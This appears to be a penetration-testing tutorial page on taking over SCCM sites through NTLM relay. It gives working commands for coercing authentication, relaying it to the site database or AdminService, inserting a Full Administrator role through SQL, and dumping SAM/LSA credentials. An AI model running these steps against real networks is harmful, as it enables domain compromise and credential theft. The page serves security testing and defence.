---
authors: BlWasp, ShutdownRepo, q-roland, felixbillieres
category: ad
---

# SCCM site takeover

## Theory

Some SCCM configurations make it possible to abuse the permissions of the site server / passive site server machine accounts in order to compromise the SCCM infrastructure via relay attacks.

> [!TIP]
> For additional attack techniques and defense strategies related to SCCM site takeover, refer to the following techniques from the [Misconfiguration-Manager repository](https://github.com/subat0mik/Misconfiguration-Manager/tree/main/attack-techniques):
> - [TAKEOVER-1: Relay to Site DB (MSSQL)](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-1/takeover-1_description.md)
> - [TAKEOVER-2: Relay to Site DB (SMB)](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-2/takeover-2_description.md)
> - [TAKEOVER-3: Relay to AD CS](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-3/takeover-3_description.md)
> - [TAKEOVER-4: Relay CAS to Child](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-4/takeover-4_description.md)
> - [TAKEOVER-5: Relay to AdminService](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-5/takeover-5_description.md)
> - [TAKEOVER-6: Relay to SMS Provider (SMB)](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-6/takeover-6_description.md)
> - [TAKEOVER-7: Relay Between HA](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-7/takeover-7_description.md)
> - [TAKEOVER-8: Relay to LDAP](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-8/takeover-8_description.md)
> - [TAKEOVER-9: SQL Linked as DBA](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-9/takeover-9_description.md)

### Relaying the primary site server

A site server machine account is required to be member of the local Administrators group on the site database server and on every site server hosting the "SMS Provider" role in the hierarchy (See [SCCM Topology](../../index#topology)):

> The user account that installs the site must have the following permissions:
>
> * Administrator on the following servers:
>   * The site server
>   * Each SQL Server that hosts the site database
>   * Each instance of the SMS Provider for the site
>   * Sysadmin on the instance of SQL Server that hosts the site database
>
> _(source:_ [_Microsoft.com_](https://learn.microsoft.com/en-us/mem/configmgr/core/servers/deploy/install/prerequisites-for-installing-sites)_)_

As a result, NTLM authentication data can be obtained from an SCCM primary site server and relayed in order to obtain administrative access to the site database, or interact as a local administrator with the HTTP API on the SMS Provider. In both cases, this can lead to the full compromise of the SCCM infrastructure.

### Relaying a passive site server

As described by [Garrett Foster](https://twitter.com/garrfoster) in this [article](https://posts.specterops.io/sccm-hierarchy-takeover-with-high-availability-7dcbd3696b43), when a passive site server is set up for high availability purpose, its machine account must be a member of the local Administrators group on the active site server. It must also be administrator on all the site system deployed in the site, including the MSSQL database. As a result, the same NTLM relaying attacks as described for primary site servers can be exploited in order to compromise the SCCM site database or gain privileged access to the HTTP API of the SMS Provider.

## Practice

> [!TIP]
> For more details about how these attacks work, refer to the article "[SCCM Site Takeover via Automatic Client Push Installation](https://posts.specterops.io/sccm-site-takeover-via-automatic-client-push-installation-f567ec80d5b1)" by [Chris Thompson](https://mobile.twitter.com/_mayyhem) for the database attack, and "[Site Takeover via SCCM's AdminService API](https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf)" by [Garrett Foster](https://twitter.com/garrfoster) for the HTTP one.

### Relay to the MSSQL site database

> [!CAUTION]
> Some requirements are needed to perform the attack:
> 
> * automatic site assignment and automatic site-wide [client push installation](../../index#client-push-installation-1) are enabled
> * fallback to NTLM authentication is enabled (default)
> * the hotfix [KB15599094](https://learn.microsoft.com/fr-fr/mem/configmgr/hotfix/2207/15599094) is not installed (it prevents the client push installation account to perform an NTLM connection to a client)
> * PKI certificates are not required for client authentication (default)
> * either:
> 
>   * MSSQL is reachable on the site database server
> 
> OR
> 
>   * SMB is reachable and SMB signing isn't required on the site database server
>   * knowing the three-character site code for the SCCM site is required (step 3 below)
>   * knowing the NetBIOS name, FQDN, or IP address of a site management point is required
>   * knowing the NetBIOS name, FQDN, or IP address of the site database server is required
> 
> The first four requirements above apply to the [client push installation coercion technique](../../index#client-push-installation). But without them, a regular coercion technique could still be used (petitpotam, printerbug, etc.).

#### Step 1: retrieve the controlled user SID

The first step consists in retrieving the hexadecimal format of the user's SID (Security IDentifier) to grant "Full Administrator SCCM role" to, on the site database server. The hex formatted SID is needed in a part below: [Step 4: Obtain an SQL console](#step-4-obtain-an-sql-console).

::: tabs

=== UNIX-like

From UNIX-like systems, the Samba utility named [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) can be used for this purpose.

```bash
rpcclient -c "lookupnames $USER" $TARGET_IP
```

Impacket's [lookupsid](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py) (Python) can also be used to retrieve the user's SID.

```bash
lookupsid.py "$DOMAIN"/"$USERNAME":"$PASSWORD"@"$TARGET_IP_OR_NAME"
```

The returned SID value is in canonical format and not hexadecimal, [impacket](https://github.com/fortra/impacket/blob/34229464dab9ed4e432fdde56d14a916baaac4db/impacket/ldap/ldaptypes.py#L48) can be used to convert it as follows.

```python
from impacket.ldap import ldaptypes
sid=ldaptypes.LDAP_SID()
sid.fromCanonical('sid_value')
print('0x' + ''.join('{:02X}'.format(b) for b in sid.getData()))
```

=== Windows

From Windows systems, [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#) can be used for this purpose.

```
# this should be run on the windows SCCM client as the user (no need for admin privileges here)
SharpSCCM.exe get user-sid
```

:::

#### Step 2: setup NTLM relay server

The target of the [NTLM relay attack](../../ntlm/relay.md) must be set to the site database server, either on the MS-SQL (port `1433/tcp`), or SMB service (port `445/tcp`) if the relayed user has admin privileges on the target. The rest of this page is focusing on relaying the authentication on the MS-SQL service.

::: tabs

=== UNIX-like

From UNIX-like systems, [Impacket](https://github.com/fortra/impacket)'s [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) (Python) script can be used for that purpose. In the examples below, the `-socks` option is used for more versatility but is not required.

```bash
# targetting MS-SQL
ntlmrelayx.py -t "mssql://siteDatabase.domain.local" -smb2support -socks

# targeting SMB
ntlmrelayx.py -t "siteDatabase.domain.local" -smb2support -socks
```

=== Windows

From Windows systems, [Inveigh-Relay](https://github.com/Kevin-Robertson/Inveigh) (Powershell) can be used as an alternative to [Impacket](https://github.com/fortra/impacket)'s [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py), however it does not feature the same SOCKS functionality, needed in the steps detailed below, meaning the exploitation from Windows system will need to be adapted.

:::

For more insight on NTLM relay attacks and tools options, see the corresponding page on The Hacker Recipes: [NTLM Relay](../../ntlm/relay.md).

#### Step 3: coerce authentication

The primary site server's authentication can be coerced via automatic client push installation targeting the relay server with [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#). For more information, see the corresponding article "[Coercing NTLM authentication from SCCM](https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a)" by [Chris Thompson](https://mobile.twitter.com/_mayyhem). Alternatively, the server's authentication could be coerced with other, more common, coercion techniques ([PrinterBug](../../print-spooler-service/printerbug.md), [PetitPotam](../../mitm-and-coerced-authentications/ms-efsr.md), [ShadowCoerce](../../mitm-and-coerced-authentications/ms-fsrvp.md), [DFSCoerce](../../mitm-and-coerced-authentications/ms-dfsnm.md), etc.).

::: tabs

=== UNIX-like

From UNIX-like systems, authentication can be coerced through [PrinterBug](../../print-spooler-service/printerbug.md), [PetitPotam](../../mitm-and-coerced-authentications/ms-efsr.md), [ShadowCoerce](../../mitm-and-coerced-authentications/ms-fsrvp.md), [DFSCoerce](../../mitm-and-coerced-authentications/ms-dfsnm.md), etc. (not based on triggering the client push installation).

There isn't any UNIX-like alternative to the `SharpSCCM.exe invoke client-push` feature (yet).

=== Windows

```powershell
SharpSCCM.exe invoke client-push -mp "SCCM-Server" -sc "$SITE_CODE" -t "attacker.domain.local"
```

:::

The rest of this page is focusing on relaying the authentication on the MS-SQL service.

#### Step 4: Obtain an SQL console

If the NTLM relay attack is a success and was targeting the MS-SQL service with SOCKS support, an SQL console could be obtained on the SCCM database through the opened socks proxy. From UNIX-like systems, [Impacket](https://github.com/fortra/impacket)'s [mssqlclient](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) (Python) can be used for that purpose.

```bash
proxychains mssqlclient.py "DOMAIN/SCCM-Server$"@"siteDatabase.domain.local" -windows-auth
```

Once the console is obtained, the attack can proceed to granting the user full privileges by running the following commands in the SQL console.

```
--Switch to site database
use CM_<site_code>

--Add the SID, the name of the current user, and the site code to the RBAC_Admins table
INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (<SID_in_hex_format>,'DOMAIN\user',0,0,'','','','','<site_code>');

--Retrieve the AdminID of the added user
SELECT AdminID,LogonName FROM RBAC_Admins;

--Add records to the RBAC_ExtendedPermissions table granting the AdminID the Full Administrator (SMS0001R) RoleID for the "All Objects" scope (SMS00ALL), 
--the "All Systems" scope (SMS00001), 
--and the "All Users and User Groups" scope (SMS00004)
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (<AdminID>,'SMS0001R','SMS00ALL','29');
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (<AdminID>,'SMS0001R','SMS00001','1');
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (<AdminID>,'SMS0001R','SMS00004','1');
```

It is then possible to verify the new privileges on SCCM.

```
# this should be run on the windows SCCM client as the user that was just given full administrative role to 
.\SharpSCCM.exe get site-push-settings -mp "SCCM-Server" -sc "<site_code>"
```

Post exploitation via SCCM can now be performed on the network.

### Relay to the HTTP API AdminService

> [!CAUTION]
> Some requirements are needed to perform the attack:
> 
> * The HTTP API for the AdminService service is reachable on the SMS Provider server
> * knowing the NetBIOS name, FQDN, or IP address of a site management point is required
> * knowing the NetBIOS name, FQDN, or IP address of the site SMS provider server is required

#### Step 1: setup an NTLM relay server

The target of the [NTLM relay attack](../../ntlm/relay.md) must be set to the SMS Provider server, on the HTTP/S service (port `80/tcp` or `443/tcp`).

::: tabs

=== UNIX-like

From UNIX-like systems, [this PR](https://github.com/fortra/impacket/pull/1593) on [Impacket](https://github.com/fortra/impacket)'s [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) (Python) script can be used for that purpose.

```bash
ntlmrelayx.py -t https://smsprovider.domain.local/AdminService/wmi/SMS_Admin -smb2support --adminservice --logonname "DOMAIN\USER" --displayname "DOMAIN\USER" --objectsid $OBJECTSID
```

=== Windows

From Windows systems, [Inveigh-Relay](https://github.com/Kevin-Robertson/Inveigh) (Powershell) can be used as an alternative to [Impacket](https://github.com/fortra/impacket)'s [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py), however it does not feature the same functionalities regarding this specific target, need in the steps detailed below, meaning the exploitation from Windows system will need to be adapted.

:::

For more insight on NTLM relay attacks and tools options, see the corresponding page on The Hacker Recipes: [NTLM Relay](../../ntlm/relay.md).

#### Step 2: Authentication coercion

The primary site server's authentication can be coerced via automatic client push installation targeting the relay server with [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#). For more information, see the corresponding article "[Coercing NTLM authentication from SCCM](https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a)" by [Chris Thompson](https://mobile.twitter.com/_mayyhem). Alternatively, the server's authentication could be coerced with other, more common, coercion techniques ([PrinterBug](../../print-spooler-service/printerbug.md), [PetitPotam](../../mitm-and-coerced-authentications/ms-efsr.md), [ShadowCoerce](../../mitm-and-coerced-authentications/ms-fsrvp.md), [DFSCoerce](../../mitm-and-coerced-authentications/ms-dfsnm.md), etc.).

::: tabs

=== UNIX-like

From UNIX-like systems, authentication can be coerced through [PrinterBug](../../print-spooler-service/printerbug.md), [PetitPotam](../../mitm-and-coerced-authentications/ms-efsr.md), [ShadowCoerce](../../mitm-and-coerced-authentications/ms-fsrvp.md), [DFSCoerce](../../mitm-and-coerced-authentications/ms-dfsnm.md), etc. (not based on triggering the client push installation).

There isn't any UNIX-like alternative to the `SharpSCCM.exe invoke client-push` feature (yet).

=== Windows

```powershell
SharpSCCM.exe invoke client-push -mp "SCCM-Server" -sc "$SITE_CODE" -t "attacker.domain.local"
```

:::

If the NTLM relay attack is a success and ntlmrelayx.py has effectively sent the request to the sms provider server, the controlled should be now a SCCM site admin.

It is then possible to verify the new privileges on SCCM.

```powershell
# this should be run on the windows SCCM client as the user that was just given full administrative role to 
SharpSCCM.exe get site-push-settings -mp "SCCM-Server" -sc "$SITE_CODE"
```

### Relay from a passive site server to the active site server

> [!CAUTION]
> Some requirements are needed to perform the attack:
> 
> * a passive site server is present on the network and its reachable
> * knowing the NetBIOS name, FQDN, or IP address of the passive and active site servers is required
> * SMB signing is not required on the active site server (default)

#### Step 1: setup an NTLM relay server

The target of the [NTLM relay attack](../../ntlm/relay.md) must be set to the active site server, on the SMB service.

::: tabs

=== UNIX-like

From UNIX-like systems, [Impacket](https://github.com/fortra/impacket)'s [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) (Python) script can be used for that purpose.

```bash
ntlmrelayx.py -t $ACTIVE_SERVER.$DOMAIN -smb2support -socks
```

=== Windows

From Windows systems, [Inveigh-Relay](https://github.com/Kevin-Robertson/Inveigh) (Powershell) can be used as an alternative to [Impacket](https://github.com/fortra/impacket)'s [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py), however it does not feature the same functionalities regarding this specific target, need in the steps detailed below, meaning the exploitation from Windows system will need to be adapted.

:::

For more insight on NTLM relay attacks and tools options, see the corresponding page on The Hacker Recipes: [NTLM Relay](../../ntlm/relay.md).

#### Step 2: authentication coercion

The passive site server's authentication can be coerced with ([PrinterBug](../../print-spooler-service/printerbug.md), [PetitPotam](../../mitm-and-coerced-authentications/ms-efsr.md), [ShadowCoerce](../../mitm-and-coerced-authentications/ms-fsrvp.md), [DFSCoerce](../../mitm-and-coerced-authentications/ms-dfsnm.md), etc.).

If the NTLM relay attack is a success and ntlmrelayx.py has effectively sent the request to the active server, a SMB session through socks proxy has been opened with administrative rights.

#### Step 3: dump active site server account credentials

Through the socks session, it is possible to dump the local credentials stored in the SAM database, and the secrets from the LSA, with [Impacket](https://github.com/fortra/impacket)'s [secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) (Python).

```bash
proxychains4 secretsdump.py $DOMAIN/$PASSIVE_SERVER\$@$ACTIVE_SERVER.$DOMAIN
```

Retrieve the LM:NT hash of the server account.

#### Step 4: add a new SCCM `Full Admin`

Since the active site server must be a member of the SMS Provider administrators (it is member of the `SMS Admins` group), its credentials can be used to add a new controlled user to the `Full Admin` SCCM group. [sccmhunter](https://github.com/garrettfoster13/sccmhunter) (Python) can be used for this purpose.

```bash
sccmhunter.py admin -u $ACTIVE_SERVER\$ -p $LMHASH:NTHASH -ip $SMS_PROVIDER_IP

() (C:\) >> add_admin controlledUser 
() (C:\) >> show_admins
```

Post exploitation via SCCM can now be performed on the network.

> [!CAUTION]
> The tool author ([Chris Thompson](https://mobile.twitter.com/_mayyhem)) warns that [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) is a PoC only tested in lab. One should be careful when running in production environments.

## Resources

[https://posts.specterops.io/sccm-site-takeover-via-automatic-client-push-installation-f567ec80d5b1](https://posts.specterops.io/sccm-site-takeover-via-automatic-client-push-installation-f567ec80d5b1)

[https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a](https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a)

[https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf](https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf)

[https://posts.specterops.io/sccm-hierarchy-takeover-with-high-availability-7dcbd3696b43](https://posts.specterops.io/sccm-hierarchy-takeover-with-high-availability-7dcbd3696b43)

[https://github.com/subat0mik/Misconfiguration-Manager/tree/main/attack-techniques/TAKEOVER](https://github.com/subat0mik/Misconfiguration-Manager/tree/main/attack-techniques/TAKEOVER)

